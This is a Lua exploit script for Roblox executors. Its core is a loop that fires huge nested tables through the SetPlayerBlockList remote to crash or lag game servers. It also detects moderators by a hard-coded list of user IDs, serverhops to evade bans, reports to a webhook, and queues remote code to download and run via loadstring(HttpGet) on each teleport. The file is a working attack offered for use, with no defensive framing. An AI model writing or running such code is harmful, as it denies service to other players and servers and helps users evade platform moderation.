repeat task.wait() until game:GetService('Players').LocalPlayer and game:IsLoaded() and #game:GetService('Players'):GetPlayers() > 1
task.wait(1) -- crashing fix
local modvals = {97157607,1031425327,85608982,95679311,169249462,449787885,2831857,22739600,96380088,112595578,223507359,8672174,1454358278,560637277,80409277,68738329,77138760,117931886,136623130,137045959,34496596,3330667,58366835,34627754,71374194,22724524,13886182}
local players = game:GetService('Players')
local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
local httpservice = game:GetService('HttpService')
local Players = players
game:GetService('RunService'):Stop() -- optimization

function webhook(msg)
	pcall(function()
		httprequest({
			Url = getgenv().webhook,
			Body = httpservice:JSONEncode({
				["content"] = msg
			}),
			Method = "POST",
			Headers = {
				["content-type"] = "application/json"
			}
		})
	end)
end

function shop()
	local gameId
	gameId = game.PlaceId
	local servers = {}
	local req = httprequest({
		Url = "https://games.roblox.com/v1/games/" .. gameId .. "/servers/Public?sortOrder=Desc&limit=100"
	})
	local body = httpservice:JSONDecode(req.Body)
	if body and body.data then
		for i, v in next, body.data do
			if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing > 4 then
				table.insert(servers, 1, v.id)
			end
		end
	end
	task.spawn(function()
		while task.wait(0.5) do
			if #servers > 0 then
				game:GetService("TeleportService"):TeleportToPlaceInstance(gameId, servers[math.random(1, #servers)], Players.LocalPlayer)
			end
		end
	end)
	game:GetService("TeleportService").TeleportInitFailed:Connect(function()
		game:GetService("TeleportService"):TeleportToPlaceInstance(gameId, servers[math.random(1, #servers)], Players.LocalPlayer)
	end)    
end

players.PlayerAdded:Connect(function(plr)
    for i,v in next, modvals do
        if plr.UserId == v then
            game:GetService('Players').LocalPlayer:Kick('Mod')
	    webhook('Mod joined, serverhopping')
	    task.wait(0.4) -- dumbass scriptware
            shop()
        end
    end
end)

for _,plr in next, players:GetPlayers() do
    for i,v in next, modvals do
        if plr.UserId == v then
            game:GetService('Players').LocalPlayer:Kick('Mod')
	    webhook('Mod is in, serverhopping')
	    task.wait(0.4)
            shop()
        end
    end
end

print'anti ban loaded'

task.spawn(function()
    while task.wait(5) do
	if #players:GetPlayers() < 4 then
	   webhook('Players left, serverhopping')
	   shop()			
	end
    end
end)

queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/DefendTheTrainFucker.lua'))()")

shared.TeleportToSky = true
if shared.TeleportToSky then
local char = game:GetService('Players').LocalPlayer.Character
if char and char:FindFirstChild('HumanoidRootPart') then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
end
while wait(1.55) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
 
bomb(289, 6) --// change values if client crashes
end
